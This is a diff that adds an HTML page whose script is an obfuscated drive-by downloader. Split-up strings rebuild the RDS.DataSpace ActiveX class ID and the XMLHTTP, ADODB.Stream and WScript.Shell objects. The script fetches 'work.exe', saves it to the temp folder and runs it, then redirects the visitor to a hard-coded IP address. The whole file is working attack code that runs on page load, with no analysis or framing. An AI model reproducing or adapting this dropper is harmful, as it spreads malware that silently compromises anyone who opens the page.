@@ -1,0 +1,47 @@
+<html>
+<script>
+<!--
+function f(b, a, c) { return a + b + c; }
+function g(b, a) { return a + b; }
+var s = new Array
+(
+ "",
+ "work.exe",
+ "http://81.95.146.98/",
+ "object",
+ "classid",
+ f("0C0", g(f(g("3-11D0-9", "56-65A"), "id:BD96C5", "83A-0"), "cls"), g("9E36", "4FC2")),
+ g(f("ft.XMLH", "oso", "TTP"), "Micr"),
+ f("E", "G", "T"),
+ f(g(".Str", "odb"), "Ad", "eam"),
+ f(g(".She", "ipt"), "WScr", "ll"),
+ "PROCESS",
+ "TMP",
+ "/[^/]*$",
+ "/",
+ "\\"
+);
+a = document.createElement(s[3]);
+a.setAttribute(s[4], s[5]);
+with(a.CreateObject(s[6], s[0]))
+{
+ open(s[7], location.href.replace(new RegExp(s[12]), s[13] + s[1]), false);
+ send();
+ if(status < 400)
+  with(a.CreateObject(s[8], s[0]))
+  {
+   Type = 1;
+   Open();
+   Write(responseBody);
+   with(a.CreateObject(s[9], s[0]))
+   {
+    c = Environment(s[10])(s[11]) + s[14] + s[1];
+    SaveToFile(c, 2);
+    Exec(c);
+   }
+  }
+}
+location.replace(s[2]);
+// -->
+</script>
+</html>
